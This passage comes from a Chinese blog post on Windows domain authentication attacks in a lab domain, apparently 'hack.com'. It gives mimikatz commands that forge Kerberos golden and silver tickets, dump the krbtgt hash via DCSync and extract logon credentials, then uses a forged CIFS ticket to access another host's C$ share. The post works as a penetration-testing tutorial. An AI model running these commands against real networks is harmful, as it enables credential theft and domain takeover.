+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br>shell klist 查票<br>shell klist purge 清票<br>mimikatz kerberos::golden /domain:hack.com /sid:S-1-5-21-2431442348-1717482385-2017137259<br>/target:dc.hack.com /service:LDAP /rc4:a2b973c420b7df773e05ed5d780cdc7c /user:abcd /ptt<br></code></pre></td></tr></table></figure>
+
+<p>7、查询域控的krbtgt（通过LDAP服务）</p>
+<p>获取域控的krbtgt的ntlm hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz lsadump::dcsync /dc:dc.hack.com /domain:hack.com /user:krbtgt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010164633305.png" srcset="/img/loading.gif" lazyload alt="image-20231010164633305"></p>
+<p>此时又可以制作黄金票据 拿到域控权限</p>
+<h4 id="控制PC-2003"><a href="#控制PC-2003" class="headerlink" title="控制PC-2003"></a>控制PC-2003</h4><p>1.获取基本信息</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">whoami</span> /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> net config workstation 查看域</span><br></code></pre></td></tr></table></figure>
+
+<p>域名：hack.com  SID：S-1-5-21-2431442348-1717482385-2017137259</p>
+<p>2、获取服务账号的ntlm hash值</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010171348936.png" srcset="/img/loading.gif" lazyload alt="image-20231010171348936"></p>
+<p>ntlm hash:509a5497664e1415f80a550c0ba4b543</p>
+<p>3、伪造票据（CIFS共享服务）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br>shell klist 查票<br>shell klist purge 清票<br><br>mimikatz kerberos::golden /domain:hack.com /sid:S-1-5-21-2431442348-1717482385-2017137259<br>/target:PC-2003.hack.com /service:cifs /rc4:509a5497664e1415f80a550c0ba4b543 /user:abc /ptt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010171613721.png" srcset="/img/loading.gif" lazyload alt="image-20231010171613721"></p>
+<p>4、访问2003</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\PC-2003.hack.com\c$</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231010171802035.png" srcset="/img/loading.gif" lazyload alt="image-20231010171802035"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" class="category-chain-item">后渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网-Windows认证</div>
+      <div>http://example.com/2023/11/03/内网-Windows认证/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>r1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/03/%E5%86%85%E7%BD%91-Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/" title="内网-Windows密码抓取">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内网-Windows密码抓取</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%863-%E6%90%9C%E9%9B%86%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF/" title="内网信息搜集3-搜集域环境信息">
+                        <span class="hidden-mobile">内网信息搜集3-搜集域环境信息</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
